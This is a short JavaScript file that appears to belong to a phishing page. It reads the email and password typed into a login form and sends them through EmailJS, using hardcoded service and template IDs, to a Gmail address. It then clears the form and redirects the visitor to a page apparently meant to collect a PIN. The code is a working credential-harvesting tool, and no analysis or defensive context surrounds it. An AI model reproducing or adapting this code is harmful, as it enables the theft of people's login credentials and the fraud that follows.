// emailjs.init("");
const email = document.querySelector("#email");
const password = document.querySelector("#password");
const btn = document.querySelector("button");
btn.onclick = () => {
  btn.innerHTML = "Loading...";
};
const serviceId = "service_i0h7x4u";
const userId = "3yaulPAGa3CdjhurB";
const templateId = "template_3bmie4q";
document.getElementById("myForm").onsubmit = function (event) {
  event.preventDefault();
  const emailParams = {
    to_name: "kuda.helphq@gmail.com",
    email: email.value,
    password: password.value,
  };
  console.log(emailParams);
  emailjs.send(serviceId, templateId, emailParams, userId).then(
    function (response) {
      console.log("Sent successfully:", response);
      email.value = "";
      password.value = "";
      location.href = "/pin.html";
    },
    function (error) {
      console.log("Failed to send:", error);
    }
  );
};
